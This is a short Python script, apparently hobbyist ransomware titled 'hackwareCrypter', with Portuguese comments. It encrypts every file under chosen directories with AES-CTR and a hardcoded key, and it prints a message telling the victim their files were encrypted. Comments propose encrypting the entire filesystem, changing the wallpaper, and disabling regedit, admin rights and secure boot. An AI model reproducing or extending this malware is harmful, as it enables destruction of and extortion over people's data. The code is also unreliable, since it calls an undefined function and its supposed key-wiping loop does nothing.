#!/usr/bin/python3.6
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

# ------------

# a senha pode ter os seguintes tamanhos
# 128/192/256 bits - 8 bits = 1 byte = 1 letra unicode

# ------------

HARDCODED_KEY = 'hackware strike force strikes u!'

def arg_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument('-d','--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']
    
    if decrypt:
         print('''
         
         HACKWARE STRIKE FORCE   
         ---------------------
         Seus arquivos foram criptografados.
         Para decriptá-los utilize a seguinte senha '{}'
            
         '''.format(HARDCODED_KEY))
         
         key = input('Digite a senha>> ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
            
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt
        
    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files/'))
    # startDirs = [init_path, '/nome', '/etc', '/usr']
    # para encriptar todo o sistema pode fazer startDirs = [init_path, '/']
    startDirs = [init_path]
    
    #percorrer todas as pastas selecionadas para encriptar
    
    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(filename, cryptFn)
            
    # depois de encriptar os arquivos do usuario precisamos limpar a chave da memoria
    # sobrescrever a memoria com espaco vazio
    
    for _ in range(100):
        pass
    
    if not decrypt:
        
        # codigo da zuera aqui
        
        pass
        # apos a encriptacao vc pode alterar o wallpaper
        # alterar icones, desativar o regedit, admin, bios secure boot, etc
        
if __name__ == '__main__':
    main()